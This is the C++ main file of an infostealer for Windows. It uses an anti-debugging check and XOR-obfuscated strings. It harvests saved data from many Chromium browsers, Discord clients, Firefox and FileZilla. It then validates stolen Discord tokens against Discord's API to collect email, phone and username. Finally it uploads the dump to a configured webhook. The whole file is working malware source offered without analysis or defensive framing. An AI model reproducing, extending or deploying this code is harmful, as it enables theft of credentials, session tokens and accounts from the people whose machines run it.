#include "../config.hpp"
#if ANTIDBG
#include "debugging.hpp"
#endif
#include "http.hpp"
#include "stealers/chromium.hpp"
#include "stealers/filezilla.hpp"
#include "stealers/firefox.hpp"
#include <ShlObj.h>
#include <array>
#include <thread>

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
#if ANTIDBG
  if (is_debugged())
    return 0;
#endif

  std::filesystem::path local_app_data;
  {
    wchar_t buffer[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buffer);
    local_app_data = buffer;
  }

  std::filesystem::path app_data;
  {
    wchar_t buffer[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, buffer);
    app_data = buffer;
  }

  std::unique_ptr<AbstractStealer> stealers[]{
      std::make_unique<ChromiumStealer>(xor("msedge.exe"), local_app_data / "Microsoft" / "Edge" / xor("User Data")),
      std::make_unique<ChromiumStealer>(xor("chrome.exe"), local_app_data / "Google" / xor("Chrome") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("chrome.exe"), local_app_data / "Google" / xor("Chrome SxS") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("brave.exe"), local_app_data / xor("BraveSoftware") / xor("Brave-Browser") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("yandex.exe"), local_app_data / "Yandex" / xor("YandexBrowser") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("vivaldi.exe"), local_app_data / xor("Vivaldi") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("kometa.exe"), local_app_data / xor("Kometa") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("orbitum.exe"), local_app_data / xor("Orbitum") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("centbrowser.exe"), local_app_data / xor("CentBrowser") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("7star.exe"), local_app_data / xor("7Star") / xor("7Star") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("sputnik.exe"), local_app_data / "Sputnik" / "Sputnik" / "User Data"),
      std::make_unique<ChromiumStealer>(xor("epicprivacybrowser.exe"), local_app_data / xor("Epic Privacy Browser") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("uran.exe"), local_app_data / xor("uCozMedia") / xor("Uran") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("iridium.exe"), local_app_data / xor("Iridium") / "User Data"),
      std::make_unique<ChromiumStealer>(xor("opera.exe"), app_data / "Opera Software" / xor("Opera Stable")),
      std::make_unique<ChromiumStealer>(xor("opera.exe"), app_data / "Opera Software" / xor("Opera GX Stable")),
      std::make_unique<ChromiumStealer>(xor("discord.exe"), app_data / xor("discord"), true),
      std::make_unique<ChromiumStealer>(xor("discord.exe"), app_data / xor("discordcanary"), true),
      std::make_unique<ChromiumStealer>(xor("discord.exe"), app_data / xor("discordptb"), true),
      std::make_unique<ChromiumStealer>(xor("lightcord.exe"), app_data / xor("Lightcord"), true),
      std::make_unique<FirefoxStealer>(xor("firefox.exe"), app_data / "Mozilla" / xor("Firefox")),
      std::make_unique<FileZillaStealer>(app_data / xor("FileZilla")),
  };

  for (auto &stealer : stealers) {
    stealer->steal();
  }

  std::vector<std::thread> threads;
  for (auto &token : discord_tokens) {
    threads.emplace_back(std::thread([&token]() {
      try {
        auto res = HTTP::get(xor("https://discord.com/api/v9/users/@me"), {
                                                                              {"Authorization", token.token}});
        if (res.status_code == 200) {
          auto json = res.json();
          token.email = json["email"].as<std::string>();
          token.phone = json["phone"].as<std::string>();
          token.username = json["username"].as<std::string>();
          token.nitro = json[xor("premium_type")].as<int>() != 0;
        }
      } catch (const HTTPException &e) {
      }
    }));
  }

  for (auto &thread : threads)
    thread.join();

#ifdef DEBUG
  std::ofstream(xor("dump.txt")) << dump_results();
#endif

#ifdef WEBHOOK
#define BOUNDARY "----WebKitFormBoundary7MA4YWxkTrZu0gW"
  try {
    std::stringstream ss;
    ss << "--" BOUNDARY "\r\n";
    ss << xor("Content-Disposition: form-data; name=\"file\"; filename=\"dump.txt\"\r\n");
    ss << xor("Content-Type: text/plain\r\n\r\n");
    ss << dump_results() << "\r\n";
    ss << "--" BOUNDARY "--\r\n";

    HTTP::post(xor(WEBHOOK), ss.str(),
               {
                   {xor("Content-Type"), "multipart/form-data; boundary=" BOUNDARY}});
  } catch (const HTTPException &e) {
    PRINTF("Failed to send results: %s\n", e.what());
  }
#endif

  return 0;
}